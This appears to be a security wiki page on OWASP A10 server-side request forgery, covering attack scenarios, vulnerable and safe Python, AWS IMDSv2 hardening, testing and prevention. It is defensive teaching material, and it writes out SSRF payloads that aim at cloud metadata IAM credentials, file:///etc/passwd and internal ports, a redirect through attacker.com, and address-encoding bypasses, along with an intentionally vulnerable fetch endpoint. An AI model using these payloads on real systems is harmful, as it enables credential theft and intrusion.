---
title: "A10 — Server-Side Request Forgery (SSRF)"
date: 2026-08-05
tags: ["OWASP", "SSRF", "cloud-metadata", "internal-network", "request-forgery"]
categories: ["owasp"]
description: "OWASP A10 SSRF — making the server fetch attacker-controlled URLs to access internal services, cloud metadata, and bypass firewalls. Code examples and detection."
showToc: true
layout: "single"
---

## Overview

SSRF occurs when an application fetches a remote resource based on user-supplied input without validating the URL. An attacker can make the server send requests to internal services, cloud metadata endpoints, or other systems that are normally unreachable from the internet.

| Attribute | Detail |
|---|---|
| OWASP rank | #10 (new in 2021) |
| STRIDE mapping | **Information Disclosure, Tampering** |
| CWEs mapped | 1 (CWE-918) |
| Famous examples | Capital One breach (2019) — AWS metadata via SSRF, GitLab SSRF |
| Cloud risk | AWS metadata endpoint (169.254.169.254) returns IAM credentials |

---

## Attack scenarios

```
# 1. Basic SSRF — access internal service
GET /fetch?url=http://internal-admin.company.internal/admin

# 2. Cloud metadata — steal IAM credentials
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 3. File protocol — read local files
GET /fetch?url=file:///etc/passwd

# 4. Port scan internal network
GET /fetch?url=http://10.0.0.1:22    # detect SSH
GET /fetch?url=http://10.0.0.1:3306  # detect MySQL

# 5. SSRF via redirects
GET /fetch?url=http://attacker.com/redirect-to-internal
# attacker.com returns: 301 → http://169.254.169.254/latest/meta-data/
```

---

## STRIDE mapping

| Threat | Mechanism |
|---|---|
| **Information Disclosure** | SSRF fetches AWS metadata → IAM credentials → full AWS account access |
| **Information Disclosure** | SSRF reads internal API responses, config files |
| **Tampering** | SSRF triggers internal state-changing actions (POST to internal APIs) |
| **Elevation of Privilege** | Stolen IAM credentials grant cloud admin access |

---

## Vulnerable vs safe code

### Basic SSRF

```python
import requests
import urllib.parse
from ipaddress import ip_address, ip_network

# VULNERABLE — fetches any URL the user provides
@app.get("/preview")
def preview_url(url: str):
    response = requests.get(url, timeout=5)    # fetches 169.254.169.254
    return {"content": response.text}

# SAFE — strict URL allowlist + IP validation
ALLOWED_DOMAINS = {"api.trusted-service.com", "images.cdn.example.com"}

BLOCKED_NETWORKS = [
    ip_network("127.0.0.0/8"),         # loopback
    ip_network("10.0.0.0/8"),          # private
    ip_network("172.16.0.0/12"),       # private
    ip_network("192.168.0.0/16"),      # private
    ip_network("169.254.0.0/16"),      # link-local (AWS metadata)
    ip_network("::1/128"),             # IPv6 loopback
    ip_network("fc00::/7"),            # IPv6 private
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urllib.parse.urlparse(url)

        # Only allow HTTPS
        if parsed.scheme != "https":
            return False

        # Only allow specific domains
        if parsed.netloc not in ALLOWED_DOMAINS:
            return False

        # Resolve hostname to IP and check it's not internal
        import socket
        ip = ip_address(socket.gethostbyname(parsed.netloc))
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False

        return True
    except Exception:
        return False

@app.get("/preview")
def preview_url(url: str):
    if not is_safe_url(url):
        raise HTTPException(status_code=400, detail="URL not allowed")
    # Also: disable redirects to prevent redirect-based bypass
    response = requests.get(url, timeout=5, allow_redirects=False)
    if response.status_code in (301, 302, 307, 308):
        raise HTTPException(status_code=400, detail="Redirects not allowed")
    return {"content": response.text[:10000]}  # limit response size
```

### Cloud metadata protection

```bash
# AWS — IMDSv2 requires a session token (prevents SSRF from stealing credentials)
# Force IMDSv2 at instance launch:
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \             # IMDSv2 required
  --http-endpoint enabled

# Verify IMDSv2 is enforced (should fail without PUT token)
curl http://169.254.169.254/latest/meta-data/   # should fail (no token)

# IMDSv2 requires two-step: get token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
# An SSRF payload cannot perform this two-step exchange
```

---

## Detection & testing

```bash
# Basic SSRF test payloads
curl "https://target.example.com/preview?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.example.com/preview?url=file:///etc/passwd"
curl "https://target.example.com/preview?url=http://localhost:8080/admin"
curl "https://target.example.com/preview?url=http://10.0.0.1/"

# Use Burp Collaborator to detect blind SSRF
# Replace URL with collaborator.burpcollaborator.net address
# Check if your server makes DNS/HTTP requests to the collaborator

# SSRF bypass techniques to test
# IP encoding: http://2130706433/ = http://127.0.0.1/
# Octal: http://0177.0.0.1/ = http://127.0.0.1/
# IPv6: http://[::1]/
# Short URL: http://bit.ly/redirect-to-internal

# Automated SSRF scanning
nuclei -u https://target.example.com -t vulnerabilities/ssrf/
```

---

## Prevention checklist

```
□ Validate and sanitise all user-supplied URLs before fetching
□ Use an allowlist of allowed domains/IPs — not a denylist
□ Resolve hostname to IP and verify it's not in a private/internal range
□ Only allow HTTPS — deny file://, dict://, gopher://, ftp:// schemes
□ Disable HTTP redirects — or re-validate the redirect destination URL
□ Enforce IMDSv2 on all cloud instances (prevents metadata SSRF)
□ Do not return raw HTTP responses to clients — process and sanitise
□ Limit response size to prevent data exfiltration
□ Network segmentation — application servers should not reach internal admin APIs
□ Monitor outbound HTTP requests — alert on requests to metadata IPs
```

<div class="references-section">

## 📚 Related pages

<div class="ref-grid">
  <a class="ref-card" href="/wiki/owasp-top10/"><span class="ref-label">OWASP</span>OWASP Top 10 Overview</a>
  <a class="ref-card" href="/wiki/secure-architecture/microservices/"><span class="ref-label">Architecture</span>Microservices Security</a>
  <a class="ref-card" href="/wiki/owasp-top10/a05-security-misconfiguration/"><span class="ref-label">OWASP</span>A05 Security Misconfiguration</a>
  <a class="ref-card" href="/wiki/stride/"><span class="ref-label">Framework</span>STRIDE — Info Disclosure</a>
  <a class="ref-card" href="/wiki/secure-architecture/container-security/"><span class="ref-label">Architecture</span>Container Security</a>
  <a class="ref-card" href="/wiki/asm/"><span class="ref-label">Wiki</span>Attack Surface Management</a>
</div>

</div>
